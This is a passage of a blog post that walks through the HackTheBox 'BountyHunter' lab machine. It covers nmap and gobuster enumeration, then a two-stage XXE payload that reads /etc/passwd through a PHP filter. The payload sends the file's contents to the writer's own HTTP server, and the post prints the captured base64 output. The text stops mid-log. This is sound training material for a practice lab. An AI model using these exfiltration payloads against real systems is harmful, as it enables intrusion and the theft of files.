<!DOCTYPE html>
<html lang="en">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <title>
  HTB: BountyHunter Writeup · mattjohnson.cloud
</title>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="color-scheme" content="light dark">




<meta name="author" content="matt johnson">
<meta name="description" content="Here&#39;s how to solve HackTheBox&#39;s BountyHunter.">
<meta name="keywords" content="blog,cloud,personal,security,windows,chess">



  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="HTB: BountyHunter Writeup">
  <meta name="twitter:description" content="Here&#39;s how to solve HackTheBox&#39;s BountyHunter.">

<meta property="og:url" content="http://localhost:1313/posts/htb-bountyhunter/">
  <meta property="og:site_name" content="mattjohnson.cloud">
  <meta property="og:title" content="HTB: BountyHunter Writeup">
  <meta property="og:description" content="Here&#39;s how to solve HackTheBox&#39;s BountyHunter.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2021-11-20T00:00:00+00:00">
    <meta property="article:modified_time" content="2021-11-20T00:00:00+00:00">
    <meta property="article:tag" content="Hackthebox">
    <meta property="article:tag" content="Security">




<link rel="canonical" href="http://localhost:1313/posts/htb-bountyhunter/">


<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>


  
  
  <link rel="stylesheet" href="/css/coder.css" media="screen">






  
    
    
    <link rel="stylesheet" href="/css/coder-dark.css" media="screen">
  



 




<link rel="icon" type="image/svg+xml" href="/images/favicon.svg" sizes="any">
<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">

<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="manifest" href="/site.webmanifest">
<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">









</head>






<body class="preload-transitions colorscheme-auto">
  
<div class="float-container">
    <a id="dark-mode-toggle" class="colorscheme-toggle">
        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
    </a>
</div>


  <main class="wrapper">
    <nav class="navigation">
  <section class="container">
    
    <a class="navigation-title" href="http://localhost:1313/">
      mattjohnson.cloud
    </a>
    
    
      <input type="checkbox" id="menu-toggle" />
      <label class="menu-button float-right" for="menu-toggle">
        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
      </label>
      <ul class="navigation-list">
        
          
            <li class="navigation-item">
              <a class="navigation-link " href="/about/">about</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="/posts/">blog</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="/tags/">tags</a>
            </li>
          
        
        
      </ul>
    
  </section>
</nav>


    <div class="content">
      
  <section class="container post">
    <article>
      <header>
        <div class="post-title">
          <h1 class="title">
            <a class="title-link" href="http://localhost:1313/posts/htb-bountyhunter/">
              HTB: BountyHunter Writeup
            </a>
          </h1>
        </div>
        <div class="post-meta">
          <div class="date">
            <span class="posted-on">
              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
              <time datetime="2021-11-20T00:00:00Z">
                November 20, 2021
              </time>
            </span>
            <span class="reading-time">
              <i class="fa-solid fa-clock" aria-hidden="true"></i>
              10-minute read
            </span>
          </div>
          <div class="authors">
  <i class="fa-solid fa-user" aria-hidden="true"></i>
    <a href="/authors/matt-johnson/">Matt Johnson</a></div>

          
          <div class="tags">
  <i class="fa-solid fa-tag" aria-hidden="true"></i>
    <span class="tag">
      <a href="/tags/hackthebox/">Hackthebox</a>
    </span>
      <span class="separator">•</span>
    <span class="tag">
      <a href="/tags/security/">Security</a>
    </span></div>

        </div>
      </header>

      <div class="post-content">
        
        <div class="custom-toc">
    <nav id="TableOfContents">
  <ol>
    <li><a href="#high-level-information">High-Level Information</a></li>
    <li><a href="#initial-foothold">Initial Foothold</a></li>
    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
  </ol>
</nav>
</div>
<h1 id="high-level-information">
  High-Level Information
  <a class="heading-link" href="#high-level-information">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h1>
<p>Machine Name: BountyHunter</p>
<p>IP Address: 10.10.11.100</p>
<p>Difficulty: Medium</p>
<p>Summary: HackTheBox&rsquo;s BountyHunter was an excellent easy-intermediate machine that allows one to learn about XML External Entity vulnerabilities, LFI vulnerabilities, and the dangers of trusting unsanitized input in custom code. The initial foothold is gained by enumerating the website on port 80, which contains a bounty report system that utilizes encoded <code>XMLHttpRequests</code>. Due to a PHP misconfiguration and a lack of input sanitization, this allows for the remote enumeration of the victim filesystem. This enumeration process was aided by a script that I created to automate the more tedious parts of the process and present internal files in a fully decoded format. During enumeration, a <code>db.php</code> file containing hardcoded database credentials was discovered and subsequently determined to also grant access to the <code>development</code> user via SSH. From there, a note left by one of the developers identifies a script that needs to be tested, which the <code>development</code> user is able to run as <code>root</code>. The script determines whether a given ticket&rsquo;s formatting is valid. Due to poor input validation and the script&rsquo;s dangerous use of Python&rsquo;s <code>eval()</code> function, the <code>development</code> user can execute code as <code>root</code> utilizing a specially crafted ticket.</p>
<p>Tools Used: nmap, BurpSuite, gobuster, <a href="https://github.com/infosecmatt/php_xxe_lfi"  class="external-link" target="_blank" rel="noopener">php_xxe_lfi (custom)</a></p>
<h1 id="initial-foothold">
  Initial Foothold
  <a class="heading-link" href="#initial-foothold">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h1>
<p>As always, I began by running Nmap:</p>
<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/bountyhunter<span style="color:#ff7b72;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span>└─$ nmap -sC -sV -p- -oA nmap/nmap 10.10.11.100
</span></span><span style="display:flex;"><span>Starting Nmap 7.91 <span style="color:#ff7b72;font-weight:bold">(</span> https://nmap.org <span style="color:#ff7b72;font-weight:bold">)</span> at 2021-08-25 07:58 EDT
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#ff7b72">for</span> 10.10.11.100
</span></span><span style="display:flex;"><span>Host is up <span style="color:#ff7b72;font-weight:bold">(</span>0.061s latency<span style="color:#ff7b72;font-weight:bold">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#a5d6ff">65533</span> closed ports
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span style="color:#ff7b72;font-weight:bold">(</span>Ubuntu Linux; protocol 2.0<span style="color:#ff7b72;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#a5d6ff">3072</span> d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 <span style="color:#ff7b72;font-weight:bold">(</span>RSA<span style="color:#ff7b72;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#a5d6ff">256</span> a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 <span style="color:#ff7b72;font-weight:bold">(</span>ECDSA<span style="color:#ff7b72;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#a5d6ff">256</span> a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 <span style="color:#ff7b72;font-weight:bold">(</span>ED25519<span style="color:#ff7b72;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.41 <span style="color:#ff7b72;font-weight:bold">((</span>Ubuntu<span style="color:#ff7b72;font-weight:bold">))</span>
</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.41 <span style="color:#ff7b72;font-weight:bold">(</span>Ubuntu<span style="color:#ff7b72;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span>|_http-title: Bounty Hunters
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#ff7b72">done</span>: <span style="color:#a5d6ff">1</span> IP address <span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">1</span> host up<span style="color:#ff7b72;font-weight:bold">)</span> scanned in 39.43 seconds
</span></span></code></pre></div><p>Given that only SSH and a web server were open, I spun up a gobuster scan in the background and began to manually enumerate the website:</p>
<p><img src="web0.png" alt=""> <img src="web1.png" alt=""></p>
<p>The initial gobuster scan led to the discovery of several navigable folders within the web application:</p>
<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/bountyhunter<span style="color:#ff7b72;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span>└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t <span style="color:#a5d6ff">100</span> -u http://10.10.11.100 | tee gobuster.out
</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">===============================================================</span>
</span></span><span style="display:flex;"><span>Gobuster v3.1.0
</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#ff7b72;font-weight:bold">(</span>@TheColonial<span style="color:#ff7b72;font-weight:bold">)</span> &amp; Christian Mehlmauer <span style="color:#ff7b72;font-weight:bold">(</span>@firefart<span style="color:#ff7b72;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">===============================================================</span>
</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Url:                     http://10.10.11.100
</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Method:                  GET
</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Threads:                 <span style="color:#a5d6ff">100</span>
</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Negative Status codes:   <span style="color:#a5d6ff">404</span>
</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> User Agent:              gobuster/3.1.0
</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Timeout:                 <span style="color:#79c0ff">10s</span>
</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">===============================================================</span>
</span></span><span style="display:flex;"><span>2021/08/25 08:14:09 Starting gobuster in directory enumeration <span style="color:#79c0ff">mode</span>
</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">===============================================================</span>
</span></span><span style="display:flex;"><span>/assets               <span style="color:#ff7b72;font-weight:bold">(</span>Status: 301<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>Size: 313<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#ff7b72;font-weight:bold">[</span>--&gt; http://10.10.11.100/assets/<span style="color:#ff7b72;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span>/css                  <span style="color:#ff7b72;font-weight:bold">(</span>Status: 301<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>Size: 310<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#ff7b72;font-weight:bold">[</span>--&gt; http://10.10.11.100/css/<span style="color:#ff7b72;font-weight:bold">]</span>   
</span></span><span style="display:flex;"><span>/js                   <span style="color:#ff7b72;font-weight:bold">(</span>Status: 301<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>Size: 309<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#ff7b72;font-weight:bold">[</span>--&gt; http://10.10.11.100/js/<span style="color:#ff7b72;font-weight:bold">]</span>    
</span></span><span style="display:flex;"><span>/resources            <span style="color:#ff7b72;font-weight:bold">(</span>Status: 301<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>Size: 316<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#ff7b72;font-weight:bold">[</span>--&gt; http://10.10.11.100/resources/<span style="color:#ff7b72;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span>/server-status        <span style="color:#ff7b72;font-weight:bold">(</span>Status: 403<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>Size: 277<span style="color:#ff7b72;font-weight:bold">]</span>                                     
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">===============================================================</span>
</span></span><span style="display:flex;"><span>2021/08/25 08:16:07 <span style="color:#79c0ff">Finished</span>
</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">===============================================================</span>
</span></span></code></pre></div><p>Within the <code>/resources</code> directory was an especially interesting file, <code>README.txt</code>:</p>
<p><img src="web3.png" alt=""> <img src="web4.png" alt=""></p>
<p>While this didn&rsquo;t give me any immediate attack vector, the information contained within the file would prove useful later. Additionally, navigating those web directories helped signal that I should probably perform further enumeration of <code>php</code> and <code>txt</code> files. I ran an additional gobuster scan to see if searching for those extensions gave further information.</p>
<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/bountyhunter<span style="color:#ff7b72;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span>└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t <span style="color:#a5d6ff">100</span> -u http://10.10.11.100/ -x php,txt | tee gobuster-files-dir.out  
</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">===============================================================</span>
</span></span><span style="display:flex;"><span>Gobuster v3.1.0
</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#ff7b72;font-weight:bold">(</span>@TheColonial<span style="color:#ff7b72;font-weight:bold">)</span> &amp; Christian Mehlmauer <span style="color:#ff7b72;font-weight:bold">(</span>@firefart<span style="color:#ff7b72;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">===============================================================</span>
</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Url:                     http://10.10.11.100/
</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Method:                  GET
</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Threads:                 <span style="color:#a5d6ff">100</span>
</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Negative Status codes:   <span style="color:#a5d6ff">404</span>
</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> User Agent:              gobuster/3.1.0
</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Extensions:              php,txt
</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Timeout:                 <span style="color:#79c0ff">10s</span>
</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">===============================================================</span>
</span></span><span style="display:flex;"><span>2021/08/26 09:25:27 Starting gobuster in directory enumeration <span style="color:#79c0ff">mode</span>
</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">===============================================================</span>
</span></span><span style="display:flex;"><span>/index.php            <span style="color:#ff7b72;font-weight:bold">(</span>Status: 200<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>Size: 25169<span style="color:#ff7b72;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span>/assets               <span style="color:#ff7b72;font-weight:bold">(</span>Status: 301<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>Size: 313<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#ff7b72;font-weight:bold">[</span>--&gt; http://10.10.11.100/assets/<span style="color:#ff7b72;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span>/portal.php           <span style="color:#ff7b72;font-weight:bold">(</span>Status: 200<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>Size: 125<span style="color:#ff7b72;font-weight:bold">]</span>                                  
</span></span><span style="display:flex;"><span>/css                  <span style="color:#ff7b72;font-weight:bold">(</span>Status: 301<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>Size: 310<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#ff7b72;font-weight:bold">[</span>--&gt; http://10.10.11.100/css/<span style="color:#ff7b72;font-weight:bold">]</span>   
</span></span><span style="display:flex;"><span>/resources            <span style="color:#ff7b72;font-weight:bold">(</span>Status: 301<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>Size: 316<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#ff7b72;font-weight:bold">[</span>--&gt; http://10.10.11.100/resources/<span style="color:#ff7b72;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span>/db.php               <span style="color:#ff7b72;font-weight:bold">(</span>Status: 200<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>Size: 0<span style="color:#ff7b72;font-weight:bold">]</span>                                       
</span></span><span style="display:flex;"><span>/js                   <span style="color:#ff7b72;font-weight:bold">(</span>Status: 301<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>Size: 309<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#ff7b72;font-weight:bold">[</span>--&gt; http://10.10.11.100/js/<span style="color:#ff7b72;font-weight:bold">]</span>       
</span></span><span style="display:flex;"><span>/server-status        <span style="color:#ff7b72;font-weight:bold">(</span>Status: 403<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>Size: 277<span style="color:#ff7b72;font-weight:bold">]</span>                                     
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">===============================================================</span>
</span></span><span style="display:flex;"><span>2021/08/26 09:30:14 <span style="color:#79c0ff">Finished</span>
</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">===============================================================</span>
</span></span></code></pre></div><p>During additional manual enumeration of the website, a portal and Bug Report System, both of which were in beta, were identified. Even though the Bug Report System was not fully implemented, utilizing BurpSuite helped lay bare a potential path to either LFI or RCE via an XXE vulnerability.</p>
<p><img src="web2.png" alt=""> <img src="burp0.png" alt=""></p>
<p>As demonstrated above, the data was being transmitted as XML with both URL and base64 encoding (which can be decoded in BurpSuite using <code>Ctrl+Shift+U</code> and <code>Ctrl+Shift+B</code>, respectively). Using any sort of structured data format (e.g., JSON, XML) to transmit information is at the core of many common web-based services, but the deserialization process can result in vulnerabilities. I did a bit of PHP-specific research and found some excellent writeups that helped formulate an attack path (References: <a href="https://sensepost.com/blog/2014/revisting-xxe-and-abusing-protocols/"  class="external-link" target="_blank" rel="noopener">1</a> <a href="https://portswigger.net/web-security/xxe"  class="external-link" target="_blank" rel="noopener">2</a> <a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html"  class="external-link" target="_blank" rel="noopener">3</a>).</p>
<p>I replaced the original payload with the first of a multistage chain of requests that would eventually send base64-encoded files on the remote machine as the parameter of a <code>GET</code> request. In addition, I set up a python HTTP server to deliver the second stage of the payload and receive the base64-encoded files. The first payload looked as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">&lt;?xml version=&#34;1.0&#34; ?&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">&lt;!DOCTYPE r [
</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">&lt;!ELEMENT r ANY &gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">&lt;!ENTITY % sp SYSTEM &#34;http://10.10.14.10/stage2.xml&#34;&gt;</span>
</span></span><span style="display:flex;"><span>%sp;
</span></span><span style="display:flex;"><span>%param1;
</span></span><span style="display:flex;"><span>]&gt;
</span></span><span style="display:flex;"><span><span style="color:#7ee787">&lt;title&gt;</span><span style="color:#ffa657">&amp;exfil;</span><span style="color:#7ee787">&lt;/title&gt;</span>
</span></span></code></pre></div><p>The first payload is designed to reach back to my machine and grab the second stage of the payload, which is as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">&lt;!ENTITY % data SYSTEM &#34;php://filter/convert.base64-encode/resource=/etc/passwd&#34;&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">&lt;!ENTITY % param1 &#34;&lt;!ENTITY exfil SYSTEM &#39;http://10.10.14.10/stage2.xml?%data;&#39;&gt;</span>&#34;&gt;
</span></span></code></pre></div><p>For this chain to work, I did multiple things. First, I set up an HTTP server using python&rsquo;s <code>http.server</code> module. Then, to deliver the first payload I inserted the XML into the <code>data</code> parameter in the initial <code>POST</code> request, base64 and URL-encoded it (using <code>Ctrl+B</code> and <code>Ctrl+U</code> within BurpSuite, respectively), and sent it.</p>
<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/bountyhunter<span style="color:#ff7b72;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span>└─$ sudo python3 -m http.server <span style="color:#a5d6ff">80</span>
</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#a5d6ff">80</span> <span style="color:#ff7b72;font-weight:bold">(</span>http://0.0.0.0:80/<span style="color:#ff7b72;font-weight:bold">)</span> ...
</span></span><span style="display:flex;"><span>10.10.11.100 - - <span style="color:#ff7b72;font-weight:bold">[</span>25/Aug/2021 11:54:25<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">&#34;GET /stage2.xml HTTP/1.0&#34;</span> <span style="color:#a5d6ff">200</span> -
</span></span><span style="display:flex;"><span>10.10.11.100 - - <span style="color:#ff7b72;font-weight:bold">[</span>25/Aug/2021 11:54:26<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">&#34;GET /stage2.xml?cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMDoxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMToxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC10aW1lc3luYzp4OjEwMjoxMDQ6c3lzdGVtZCBUaW1lIFN5bmNocm9uaXphdGlvbiwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDY6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXNsb2c6eDoxMDQ6MTEwOjovaG9tZS9zeXNsb2c6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwNTo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnRzczp4OjEwNjoxMTE6VFBNIHNvZnR3YXJlIHN0YWNrLCwsOi92YXIvbGliL3RwbTovYmluL2ZhbHNlCnV1aWRkOng6MTA3OjExMjo6L3J1bi91dWlkZDovdXNyL3NiaW4vbm9sb2dpbgp0Y3BkdW1wOng6MTA4OjExMzo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCmxhbmRzY2FwZTp4OjEwOToxMTU6Oi92YXIvbGliL2xhbmRzY2FwZTovdXNyL3NiaW4vbm9sb2dpbgpwb2xsaW5hdGU6eDoxMTA6MTo6L3Zhci9jYWNoZS9wb2xsaW5hdGU6L2Jpbi9mYWxzZQpzc2hkOng6MTExOjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC1jb3JlZHVtcDp4Ojk5OTo5OTk6c3lzdGVtZCBDb3JlIER1bXBlcjovOi91c3Ivc2Jpbi9ub2xvZ2luCmRldmVsb3BtZW50Ong6MTAwMDoxMDAwOkRldmVsb3BtZW50Oi9ob21lL2RldmVsb3BtZW50Oi9iaW4vYmFzaApseGQ6eDo5OTg6MTAwOjovdmFyL3NuYXAvbHhkL2NvbW1vbi9seGQ6L2Jpbi9mY